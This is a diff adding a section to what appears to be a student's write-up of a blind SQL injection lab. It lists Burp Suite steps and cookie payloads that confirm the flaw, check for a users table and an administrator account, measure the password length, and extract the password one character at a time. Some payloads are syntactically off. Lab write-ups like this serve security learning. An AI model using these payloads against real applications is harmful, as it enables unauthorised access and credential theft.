@@ -154,3 +154,69 @@ TrackingId=xyz' AND '1'='2
 → Condition is false → No message
 
 This confirms that the app’s response reflects the result of the injected condition.
+
+## Look at this lab
+
+![image alt](https://github.com/GERRY-01/Cybersecurity-Projects-/blob/main/Cybersec/SQLinjection/Screenshot%20from%202025-10-23%2020-39-00.png?raw=true)
+
+This lab requires as to find the password of the administrator and login
+
+## Steps of Solving the Lab
+
+1.  Open burpsuit and make all the requests from there
+2.  In burpsuit we will first of all test the true/false conditions in order to determine if the site is vulnerable to blind sql injection
+   You can inject this payload
+```
+TrackingId=xyz' AND '1'='1
+```
+you will observe that the welcome message appears because the condition is true
+
+Try again injecting this:
+
+```
+TrackingId=xyz' AND '1'='2
+```
+The condition is false, so no welcome message
+
+3. Checking if the users table exist. You will run this command
+
+   ```
+  TrackingId=xyz' AND SELECT 'a' FROM users LIMIT 1= 'a
+  ```
+if the users table exist, then it should select 'a'. Since a=a, the condition will be true hence you will see the welcome message. If it doesn't exist, the condition will be false and you won't see the welcome message
+
+4. Check if the username administrator exists in the database. Run this command
+
+```
+ TrackingId=xyz' AND SELECT 'a' FROM users WHERE username='administrator' ='a
+ ```
+If the administrator exists, it will select 'a'. Since a=a, the condition will be true and it will return the welcom message. If it doesnn't exist, the condition will be false and there will be no welcome message
+
+5. After knowing that the administrator exist, we now need to find its password. First of all, we need to know the length of the password. We can do that by injecting this
+
+```
+ TrackingId=xyz' AND LENGTH((SELECT password FROM users WHERE username='administrator')) > 1--
+ ```
+In this case I will first check if the length is greater than 1. If it is true then the welcome message will be displayed. We will keep on incrementing until we reach at the false value. Instead of incrementing manually, we can use burpsuit intruder.
+After doing this, I found that the length is 20.
+
+6. Cracking the password character by character.
+Since we know that the length of the password is 20. We can bruteforce each character one by one. For example
+
+```
+TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) ='a
+```
+in this case, we will try checking if the first character is a. If not we try it with 'b' and so on and so on
+
+Then we move to the second character
+
+```
+TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 2, 1) = 'a
+we try all possible characters from a to z until we find a match
+
+we do the same for all the 20 characters. This process is tiresome. You can use burpsuit intruder to make your work easier
+
+
+
+
+
